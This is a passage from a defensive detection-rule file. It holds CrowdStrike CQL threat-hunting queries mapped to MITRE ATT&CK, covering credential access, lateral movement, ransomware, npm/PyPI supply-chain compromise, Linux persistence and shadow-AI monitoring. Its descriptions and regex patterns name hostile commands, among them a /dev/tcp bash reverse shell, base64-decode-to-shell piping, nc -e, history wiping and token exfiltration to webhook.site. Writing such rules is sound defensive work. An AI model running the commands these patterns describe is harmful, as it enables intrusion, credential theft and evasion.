| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1003/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "kerberoasting",
    title: "Kerberoasting (SPN ticket request bursts)",
    description:
      "Heuristic for Kerberoasting tools — Rubeus kerberoast, Get-DomainSPNTicket, GetUserSPNs.py / -request — service-ticket harvesting for offline cracking.",
    mitre: ["T1558.003"],
    category: "credential-access",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/(kerberoast|Get-DomainSPNTicket|Invoke-Kerberoast|GetUserSPNs|Rubeus.*kerberoast)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1558/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "ad-recon-tooling",
    title: "AD recon tooling (PowerView / SharpHound / ADRecon)",
    description:
      "Strings characteristic of PowerView, SharpHound / BloodHound, and ADRecon — pre-ATT&CK enumeration that almost always precedes lateral movement.",
    mitre: ["T1087.002", "T1482"],
    category: "discovery",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (CommandLine=/(Invoke-(BloodHound|ShareFinder|UserHunter|StealthUserHunter)|Get-Net(Domain|Computer|User|GroupMember|Session|LocalGroup)|Find-DomainShare|SharpHound|ADRecon|Get-DomainController|Find-LocalAdminAccess)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1087/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "domain-trust-discovery",
    title: "Domain trust enumeration",
    description:
      "nltest /domain_trusts, Get-DomainTrust, dsquery on trust objects — trust-relationship discovery for cross-domain lateral movement.",
    mitre: ["T1482"],
    category: "discovery",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\nltest\\.exe$/i AND CommandLine=/(\\/domain_trusts|\\/dclist|\\/dsgetdc)/i)
  OR (CommandLine=/(Get-DomainTrust|Get-AdTrust|Get-NetForestTrust|trustdmp)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1482/",
    author: "Curated for Project Eyas",
  },
  {
    id: "remote-share-enum",
    title: "Remote share enumeration",
    description:
      "net view, net share /domain, PowerShell Find-DomainShare — share-discovery preceding data staging or lateral movement.",
    mitre: ["T1135"],
    category: "discovery",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\net(1)?\\.exe$/i AND CommandLine=/(view\\s+\\/domain|view\\s+\\\\\\\\|share\\s+\\/domain)/i)
  OR (CommandLine=/(Find-DomainShare|Invoke-ShareFinder|Get-NetShare)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1135/",
    author: "Curated for Project Eyas",
  },
  {
    id: "psexec-style",
    title: "PsExec / SMBExec / paexec style execution",
    description:
      "PsExec-family binaries or service-name patterns (PSEXESVC, paexec, csexec) — Sysinternals + clones used for lateral movement.",
    mitre: ["T1021.002", "T1569.002"],
    category: "lateral-movement",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\(psexec|psexec64|paexec|csexec|psexesvc)\\.exe$/i)
  OR (CommandLine=/\\\\\\\\.+\\s+(-s|-u\\s+|-accepteula).*cmd/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1021/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "powershell-remoting",
    title: "PowerShell Remoting / Invoke-Command lateral",
    description:
      "WSMan-based remote execution via Invoke-Command, Enter-PSSession, or New-PSSession with -ComputerName — quiet WinRM lateral movement.",
    mitre: ["T1021.006"],
    category: "lateral-movement",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(powershell|pwsh)\\.exe$/i
| (CommandLine=/(Invoke-Command|Enter-PSSession|New-PSSession).*-ComputerName/i)
| table([ComputerName, UserName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1021/006/",
    author: "Curated for Project Eyas",
  },
  {
    id: "rmm-tooling",
    title: "RMM / remote-access tool installs (AnyDesk / TeamViewer / ScreenConnect)",
    description:
      "Threat actors increasingly deploy legitimate RMM tooling for hands-on-keyboard access. Surfaces installs of AnyDesk, TeamViewer, ScreenConnect, Atera, Splashtop, etc.",
    mitre: ["T1219"],
    category: "command-and-control",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| ImageFileName=/\\\\(AnyDesk|TeamViewer|ScreenConnect|ConnectWiseControl|Atera(Agent)?|Splashtop(Streamer)?|Syncro|RustDesk|MeshAgent|NinjaRMM|Action1|GoToAssist|LogMeIn)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1219/",
    author: "Curated for Project Eyas",
  },
  {
    id: "tunneling-tool",
    title: "Tunneling / pivot tooling (ngrok / Cloudflared / ssh -R)",
    description:
      "Reverse tunnels via ngrok, cloudflared, frp, chisel, or ssh -R — common ways to expose internal hosts to the public internet for C2.",
    mitre: ["T1572"],
    category: "command-and-control",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| (ImageFileName=/\\\\?(ngrok|cloudflared|frpc|chisel|gost|natpass)(\\.exe)?$/i)
  OR (CommandLine=/\\bssh\\b.*\\s-R\\s/i)
  OR (CommandLine=/(ngrok\\s+(tcp|http)|cloudflared\\s+tunnel)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1572/",
    author: "Curated for Project Eyas",
  },
  {
    id: "dns-suspicious-tld",
    title: "DNS resolution to dynamic / abused TLDs",
    description:
      "Outbound DNS for .top, .xyz, .gq, .tk, .cf, .ml, .duckdns.org, .ddns.net domains — high-prevalence TLDs in commodity malware C2.",
    mitre: ["T1071.004"],
    category: "command-and-control",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=DnsRequest
| DomainName=/.*\\.(top|xyz|gq|tk|cf|ml|cyou|click|fit|rest|country|kim|work|duckdns\\.org|ddns\\.net|hopto\\.org|no-ip\\.org|sytes\\.net)$/i
| groupBy([ComputerName, DomainName], function=count(as="hits"))
| sort(hits, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1071/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "tor-anonymizer",
    title: "Tor / I2P / anonymizer process",
    description:
      "tor.exe, tor browser launcher, i2psvc — anonymizer use on a corporate endpoint warrants review.",
    mitre: ["T1090.003"],
    category: "command-and-control",
    os: ["win", "lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| (ImageFileName=/\\\\?(tor|tor-browser|firefox\\.exe.*tor|i2psvc|i2prouter)(\\.exe)?$/i)
  OR (CommandLine=/(\\.onion|tor2web)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1090/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "bitlocker-tampering",
    title: "BitLocker tampering / disable",
    description:
      "manage-bde -off, Disable-BitLocker, or BitLocker key extraction — pre-encryption ransomware staging on enterprise drives.",
    mitre: ["T1486"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| (ImageFileName=/\\\\manage-bde\\.exe$/i AND CommandLine=/(\\-off|\\-changekey|\\-protectors\\s+\\-disable)/i)
  OR (CommandLine=/Disable-BitLocker/i)
  OR (CommandLine=/BackupToAAD-BitLockerKeyProtector/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1486/",
    author: "Curated for Project Eyas",
  },
  {
    id: "mass-rename-encrypt",
    title: "Mass file rename to ransomware extension",
    description:
      "Bursts of file modifications with classic ransomware extensions (.locked, .encrypted, .lockbit, .akira, .royal, .bsv) — late-stage ransomware encryption.",
    mitre: ["T1486"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=NewExecutableWritten OR #event_simpleName=PeFileWritten OR #event_simpleName=ProcessRollup2
| (CommandLine=/\\.(locked|encrypted|lockbit|akira|royal|bsv|conti|revil|ryuk|globeimposter|crypt|enc|onion|wcry)\\b/i)
  OR (TargetFileName=/\\.(locked|encrypted|lockbit|akira|royal|bsv|conti|revil|ryuk|crypt|enc|wcry)$/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, TargetFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1486/",
    author: "Curated for Project Eyas",
  },
  {
    id: "ransom-note-drop",
    title: "Ransom note creation pattern",
    description:
      "File writes named README*.txt, HOW_TO_DECRYPT*, RECOVERY_INSTRUCTIONS*, !*decrypt*, RESTORE_FILES* in user directories — ransom-note drop signal.",
    mitre: ["T1486"],
    category: "impact",
    os: ["win"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Win
| CommandLine=/(README.*\\.(txt|html)|HOW[_ ]TO[_ ](DECRYPT|RECOVER)|RECOVERY[_ ]INSTRUCTIONS|RESTORE[_ ]FILES|!.*decrypt.*\\.(txt|html))/i
| ImageFileName=/\\\\(powershell|pwsh|cmd|copy|xcopy|robocopy|move|notepad)\\.exe$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1486/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-suid-discovery",
    title: "SUID binary discovery (Linux)",
    description:
      "find / -perm -u=s, find -perm /4000, getcap — SUID/capability hunting that precedes privilege escalation on Linux.",
    mitre: ["T1083", "T1548.001"],
    category: "discovery",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| (CommandLine=/find\\b.*-perm\\s+(-?u=s|-?\\/?4000|-?[24]000)/i)
  OR (CommandLine=/getcap\\s+-r\\s+\\//i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1548/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-ai-dns-inventory",
    title: "Shadow AI: DNS inventory of public LLM services",
    description:
      "Every endpoint touching a public AI/LLM service in the last 30 days — ChatGPT, Claude, Gemini, Perplexity, Mistral, Hugging Face, Character.AI, Poe. Establishes the baseline footprint before policy decisions.",
    mitre: ["T1071.004"],
    category: "shadow-ai",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=DnsRequest
| DomainName=/(^|.*\\.)(openai\\.com|chatgpt\\.com|claude\\.ai|anthropic\\.com|gemini\\.google\\.com|bard\\.google\\.com|generativelanguage\\.googleapis\\.com|aistudio\\.google\\.com|perplexity\\.ai|mistral\\.ai|huggingface\\.co|character\\.ai|c\\.ai|poe\\.com|midjourney\\.com|stability\\.ai|runwayml\\.com|elevenlabs\\.io|groq\\.com|cohere\\.com|replicate\\.com|together\\.ai|pi\\.ai|you\\.com|deepseek\\.com|x\\.ai|grok\\.com|kagi\\.com)$/i
| groupBy([ComputerName, DomainName], function=count(as="hits"))
| sort(hits, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-ai-unsanctioned",
    title: "Shadow AI: unsanctioned services (non-Copilot users)",
    description:
      "Hosts hitting non-Microsoft AI services. Adjust the sanctioned list to your tenant — the goal is to surface employees doing AI work outside the approved tooling and pipeline.",
    mitre: ["T1071.004"],
    category: "shadow-ai",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=DnsRequest
| DomainName=/(^|.*\\.)(openai\\.com|chatgpt\\.com|claude\\.ai|anthropic\\.com|gemini\\.google\\.com|perplexity\\.ai|mistral\\.ai|huggingface\\.co|character\\.ai|poe\\.com|deepseek\\.com|x\\.ai|grok\\.com|together\\.ai|groq\\.com|replicate\\.com|cohere\\.com)$/i
| !DomainName=/copilot\\.microsoft\\.com|bing\\.com/i
| groupBy([ComputerName, UserName, DomainName], function=count(as="hits"))
| sort(hits, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-ai-code-assistants",
    title: "Shadow AI: code-assistant tooling (Cursor / Codeium / etc.)",
    description:
      "AI code assistants inhale source. Surfaces Cursor, Codeium, Tabnine, Continue.dev, Cody, Aider, Windsurf — any of which can ship proprietary code to a third-party LLM provider.",
    mitre: ["T1071.001"],
    category: "shadow-ai",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=ProcessRollup2
| (ImageFileName=/\\\\?(Cursor|Codeium|TabNine|Tabnine|Continue|Cody|aider|windsurf|sourcegraph)(\\.exe)?$/i)
  OR (CommandLine=/(cursor-server|codeium-language-server|tabnine|sourcegraph-cody|aider\\b)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-ai-api-direct",
    title: "Shadow AI: programmatic API calls (data pipelines)",
    description:
      "DNS to api.openai.com / api.anthropic.com / generativelanguage.googleapis.com from non-browser hosts indicates scripted data pipelines — high-risk exfil channel for whatever is being prompted.",
    mitre: ["T1071.001"],
    category: "shadow-ai",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=DnsRequest
| DomainName=/^api\\.(openai|anthropic|mistral|cohere|together|groq|deepseek|x)\\.(com|ai)$|^generativelanguage\\.googleapis\\.com$|^api\\.replicate\\.com$|^bedrock-runtime\\..*\\.amazonaws\\.com$/i
| groupBy([ComputerName, DomainName], function=count(as="requests"))
| sort(requests, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "shadow-ai-local-llm",
    title: "Shadow AI: local LLM runtimes (Ollama / LM Studio / GPT4All)",
    description:
      "Local model runtimes — Ollama, LM Studio, jan.ai, llama.cpp, GPT4All. Models often pulled from Hugging Face / HF mirrors; presence usually means employees moved sensitive data off-network into self-hosted inference.",
    mitre: ["T1059"],
    category: "shadow-ai",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=ProcessRollup2
| (ImageFileName=/\\\\?(ollama|lm-studio|LM Studio|jan|gpt4all|llama|llama-cli|llama-server|llamafile)(\\.exe)?$/i)
  OR (CommandLine=/(ollama\\s+(run|pull|serve)|lmstudio|gpt4all|llama-server|llamafile)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "supply-chain-npm-postinstall-shell",
    title: "NPM: install spawns shell / curl / wget (postinstall payload)",
    description:
      "npm/yarn/pnpm processes whose child is a shell, curl, wget, or base64 — the dominant pattern in Shai-Hulud (Sept 2025), the s1ngularity attacks, and most commodity npm worms.",
    mitre: ["T1195.002", "T1059"],
    category: "supply-chain",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| ParentImageFileName=/\\\\?(npm|node|yarn|pnpm|npx|bun)(\\.(exe|cmd|js))?$/i
| ImageFileName=/(\\\\(cmd|powershell|pwsh)\\.exe$|\\/(bash|sh|zsh|curl|wget|nc|ncat|python|python3|perl)$|\\\\(curl|wget)\\.exe$)/i
| table([ComputerName, UserName, ParentImageFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.reddit.com/r/crowdstrike/",
    author: "Curated for Project Eyas",
  },
  {
    id: "supply-chain-npm-token-exfil",
    title: "NPM: .npmrc / NPM_TOKEN / GITHUB_TOKEN access by node",
    description:
      "Reads of ~/.npmrc, NPM_TOKEN, GH_TOKEN, GITHUB_TOKEN env scraping by node/npm — the exfil core of Shai-Hulud and s1ngularity. Also catches credential-harvesting postinstall scripts.",
    mitre: ["T1552.001", "T1552.005"],
    category: "supply-chain",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| (ParentImageFileName=/\\\\?(npm|node|yarn|pnpm|npx|bun)(\\.(exe|cmd|js))?$/i OR ImageFileName=/\\\\?(node|npm)(\\.exe)?$/i)
| (CommandLine=/(\\.npmrc|NPM_TOKEN|GITHUB_TOKEN|GH_TOKEN|NPM_AUTH_TOKEN|HUGGINGFACE_TOKEN|AWS_ACCESS_KEY|AWS_SECRET|env\\.(GITHUB|NPM|AWS|GCP)|process\\.env\\.[A-Z_]*TOKEN)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "supply-chain-npm-exfil-endpoints",
    title: "NPM: outbound to webhook.site / requestbin / oast.fun",
    description:
      "DNS or process activity reaching webhook.site, requestbin, oast.fun, pipedream, ngrok-domains — the canonical drop sites in npm-package compromises. High-confidence exfil signal when paired with node parent.",
    mitre: ["T1041", "T1567"],
    category: "supply-chain",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=DnsRequest
| DomainName=/(^|.*\\.)(webhook\\.site|requestbin\\.com|oast\\.fun|oast\\.live|oast\\.pro|interact\\.sh|pipedream\\.net|m\\.pipedream\\.net|burpcollaborator\\.net|ngrok-free\\.app|ngrok\\.app|trycloudflare\\.com)$/i
| groupBy([ComputerName, DomainName], function=count(as="hits"))
| sort(hits, order=desc)
| head(50)`,
    source: "https://www.reddit.com/r/crowdstrike/",
    author: "Curated for Project Eyas",
  },
  {
    id: "supply-chain-npm-known-iocs",
    title: "NPM: known-compromised package strings",
    description:
      "Filename / command-line strings for confirmed-compromised packages from the Shai-Hulud (Sept 2025), s1ngularity, ua-parser-js, and rspack/styled-components incidents. Update the regex as new compromises ship.",
    mitre: ["T1195.002"],
    category: "supply-chain",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 720,
    cql: `#event_simpleName=ProcessRollup2
| (CommandLine=/(@ctrl\\/tinycolor|@ctrl\\/deluge|@ctrl\\/transmission|@nx\\/eslint-plugin|@nx\\/devkit|@nx\\/workspace|nx@21\\.|rspack-resolver|coa@2\\.0\\.[2-3]|rc@1\\.2\\.[8-9]|ua-parser-js@(0\\.7\\.29|0\\.8\\.0|1\\.0\\.0)|node-ipc@(10\\.1\\.[1-3]|11\\.0\\.0)|event-stream@3\\.3\\.6|electron-installer-debian|cross-env-shell|crossenv|d3-color@3\\.0\\.0|chalk-template|color-string-fix)/i)
  OR (CommandLine=/(processdata|getsoldemoinfor|tinycolor-fix-flags|jeyongmin|shai-hulud|s1ngularity)/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentImageFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://github.com/advisories?query=npm",
    author: "Curated for Project Eyas",
  },
  {
    id: "supply-chain-pip-pypi-postinstall",
    title: "PyPI: pip install spawns shell / network (sibling pattern)",
    description:
      "Same shape as the npm postinstall hunt, applied to pip — pip / pip3 / poetry / uv pip processes whose child is a shell, curl, or base64 decoder. Catches typosquat and dependency-confusion compromises.",
    mitre: ["T1195.002", "T1059"],
    category: "supply-chain",
    os: ["win", "mac", "lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| ParentImageFileName=/\\\\?(pip|pip3|poetry|uv|conda|pipx|python|python3)(\\.exe)?$/i
| (ImageFileName=/(\\\\(cmd|powershell|pwsh)\\.exe$|\\/(bash|sh|zsh|curl|wget|nc|ncat)$|\\\\(curl|wget)\\.exe$)/i)
  OR (CommandLine=/(base64\\s+-d|--decode|exec\\(.*base64|eval\\(.*decode)/i)
| table([ComputerName, UserName, ParentImageFileName, ImageFileName, CommandLine])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://www.crowdstrike.com/blog/cool-query-friday/",
    author: "Curated for Project Eyas",
  },
  {
    id: "macos-tcc-modification",
    title: "macOS TCC.db tampering",
    description:
      "Direct sqlite writes to TCC.db, or `tccutil reset` — privacy-framework tampering used by stealers to silently grant Full Disk Access / Screen Recording.",
    mitre: ["T1562.001"],
    category: "defense-evasion",
    os: ["mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Mac
| (CommandLine=/TCC\\.db/i)
  OR (ImageFileName=/\\/tccutil$/i AND CommandLine=/reset\\b/i)
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1562/001/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-systemd-persistence",
    title: "systemd unit installed (Linux)",
    description:
      "New .service / .timer files written under /etc/systemd or ~/.config/systemd outside of package-manager contexts.",
    mitre: ["T1543.002"],
    category: "persistence",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/(\\/etc\\/systemd\\/system\\/|\\.config\\/systemd\\/user\\/)[^\\s]+\\.(service|timer)/i
| ImageFileName=/\\/(tee|cat|cp|mv|sed|systemctl|bash|sh|zsh)$/i
| ParentBaseFileName!=/^(apt|apt-get|dpkg|yum|dnf|rpm)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1543/002/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-cron-tamper",
    title: "Cron job created or modified (Linux)",
    description:
      "Edits to /etc/crontab, /etc/cron.* or per-user crontabs — common Linux persistence vector.",
    mitre: ["T1053.003"],
    category: "persistence",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/(\\/etc\\/(crontab|cron\\.(d|hourly|daily|weekly|monthly))|\\/var\\/spool\\/cron)/i
| ImageFileName=/\\/(crontab|tee|cat|cp|mv|sed|bash|sh|zsh|python|perl)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1053/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-ld-preload",
    title: "LD_PRELOAD shared-object injection (Linux)",
    description:
      "Processes launched with LD_PRELOAD pointing at a writable path — the canonical Linux library hijack.",
    mitre: ["T1574.006"],
    category: "defense-evasion",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/LD_PRELOAD=.*\\.so\\b/i
| !CommandLine=/LD_PRELOAD=\\/usr\\/lib/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1574/006/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-shell-rc-tamper",
    title: "Shell RC file modification (Linux)",
    description:
      "Writes to ~/.bashrc, ~/.profile, ~/.zshrc, /etc/profile.d/* — startup-script persistence.",
    mitre: ["T1546.004"],
    category: "persistence",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| CommandLine=/(\\.bashrc|\\.bash_profile|\\.profile|\\.zshrc|\\.zprofile|\\/etc\\/profile\\.d\\/)/i
| ImageFileName=/\\/(echo|tee|cat|cp|mv|sed|printf)$/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1546/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-kernel-module-load",
    title: "Kernel module load via insmod / modprobe (Linux)",
    description:
      "insmod/modprobe loading a module from a non-standard path — rootkits and BPF backdoors land here.",
    mitre: ["T1547.006"],
    category: "persistence",
    os: ["lin"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2 event_platform=Lin
| ImageFileName=/\\/(insmod|modprobe)$/i
| !CommandLine=/\\/lib\\/modules\\//i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1547/006/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-reverse-shell-bash",
    title: "Bash reverse shell (Linux)",
    description:
      "Classic `bash -i >& /dev/tcp/<host>/<port> 0>&1` and `python -c 'import socket'` reverse-shell oneliners.",
    mitre: ["T1059.004", "T1219"],
    category: "command-and-control",
    os: ["lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| in(event_platform, values=["Lin", "Mac"])
| CommandLine=/(\\/dev\\/tcp\\/|socket\\.socket\\(.*SOCK_STREAM|pty\\.spawn|nc\\s+-e|ncat\\s+-e|\\bbash\\s+-i\\b)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1059/004/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-imds-access",
    title: "Cloud IMDS access from process (Linux/macOS)",
    description:
      "Process making outbound calls to 169.254.169.254 (AWS/GCP/Azure metadata) — credential theft on cloud workloads.",
    mitre: ["T1552.005"],
    category: "credential-access",
    os: ["lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=NetworkConnect
| in(event_platform, values=["Lin", "Mac"])
| RemoteAddressIP4=169.254.169.254
| join({#event_simpleName=ProcessRollup2}, field=[aid, ContextProcessId], include=[ImageFileName, CommandLine, UserName])
| !ImageFileName=/(\\/cloud-init|\\/aws\\/bin|\\/gce|\\/azure)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, RemoteAddressIP4])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1552/005/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-history-tampering",
    title: "Shell history clearing or disabling (Linux/macOS)",
    description:
      "`unset HISTFILE`, `history -c`, `> .bash_history` — operators clearing forensic trail post-intrusion.",
    mitre: ["T1070.003"],
    category: "defense-evasion",
    os: ["lin", "mac"],
    repository: "investigate_view",
    windowHours: 168,
    cql: `#event_simpleName=ProcessRollup2
| in(event_platform, values=["Lin", "Mac"])
| CommandLine=/(unset\\s+HISTFILE|export\\s+HISTFILE=\\/dev\\/null|history\\s+-c|>\\s*~\\/\\.bash_history|>\\s*~\\/\\.zsh_history|HISTSIZE=0|HISTFILESIZE=0)/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1070/003/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-base64-decode-exec",
    title: "base64 -d piped into shell (Linux/macOS)",
    description:
      "`echo … | base64 -d | bash` — the Linux/macOS analog to Windows -EncodedCommand.",
    mitre: ["T1027", "T1059.004"],
    category: "execution",
    os: ["lin", "mac"],
    repository: "investigate_view",
    windowHours: 24,
    cql: `#event_simpleName=ProcessRollup2
| in(event_platform, values=["Lin", "Mac"])
| CommandLine=/base64\\s+(-d|--decode|-D)\\b[^|]*\\|\\s*(bash|sh|zsh|python|perl)\\b/i
| table([ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName])
| sort(@timestamp, order=desc)
| head(50)`,
    source: "https://attack.mitre.org/techniques/T1027/",
    author: "Curated for Project Eyas",
  },
  {
    id: "linux-sudoers-tamper",
    title: "Sudoers / doas configuration tampering (Linux/macOS)",
    description:
      "Writes to /etc/sudoers, /etc/sudoers.d/* or /etc/doas.conf — privilege-elevation persistence.",
    mitre: ["T1548.003"],
    category: "privilege-escalation",
